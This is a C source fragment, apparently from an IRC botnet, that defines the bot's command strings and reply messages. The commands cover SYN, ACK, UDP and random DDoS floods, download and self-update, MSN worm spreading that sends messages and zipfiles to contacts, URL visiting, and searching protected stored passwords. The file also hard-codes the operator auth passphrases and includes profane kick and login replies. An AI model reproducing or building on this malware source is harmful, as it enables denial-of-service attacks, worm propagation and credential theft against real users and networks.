const char get_auth[]			= "Redpill";
const char cmd_logout[]			= "Bluepill";
const char cmd_remove[]			= "dienow";

#ifndef NO_DDOS
const char cmd_ddos_syn[]		= "ddos.syn";
const char cmd_ddos_ack[]		= "ddos.ack";
const char cmd_ddos_random[]	= "ddos.random";
#endif

#ifndef NO_SUPERSYN
const char cmd_ddos_supersyn[]	= "ddos.supersyn";
#endif

#ifndef NO_UDP
const char cmd_ddos_udp[]		= "ddos.udp";
#endif

#ifndef NO_DOWNLOAD
const char get_mnd[]			= "down";
const char get_upd[]			= "andup";
#endif

#ifndef NO_MSNSPREAD
const char cmd_msnspread_1[]	= "msn.spread";
const char cmd_msnspread_2[]	= "msn.msg";
const char cmd_msnspread_3[]	= "msn.stats";
const char cmd_msnspread_4[]	= "msn.addcontact";
#endif

#ifndef NO_VISIT
const char cmd_visit[]			= "visit";
#endif

#ifndef NO_PSTORE
const char cmd_pstore_1[]		= "pstore";
const char cmd_pstore_2[]		= "pstore.search";
#endif

char str_auth_good[]		= "%s Welcome Bitch.";
char str_auth_full[]		= "%s Fail.";
char str_logout[]			= "%s %s out.";
char str_sl_logout[]		= "%s <%i> out.";
char str_sl_no_logout[]		= "%s No user at: <%i>";
char str_sl_in_logout[]		= "%s Invalid slot: <%i>";
char str_thread_stop[]		= "%s Kill: <%d> threads";
char str_thread_ac[]		= "%s No threads";
char str_thread_kill[]		= "%s Killed thread: <%s>";
char str_thread_alr[]		= "%s %s already running: <%d>.";
char str_thread_fail[]		= "%s Fail start %s, err: <%d>.";
char str_msn_spread[]		= "[msn]: Message & Zipfile sent to: %d contacts.";
char str_msn_msg[]			= "[msn]: Message sent to: %d Contacts.";
char str_msn_stat[]			= "[msn]: Sent Stats - Messages: %d :: Files: %d :: Message & Files: %d.";
char str_kick_msg[]			= "Go fuck yourself %s.";
char str_auth_ali[]			= "%s logged in.";
char str_quit_rem[]			= "Removed by: %s!%s@%s";
char str_quit_upd[]			= "gettin new bin.";
char str_main_thread[]		= "%s main thread";
char str_bad_format[]		= "%s mis param.";
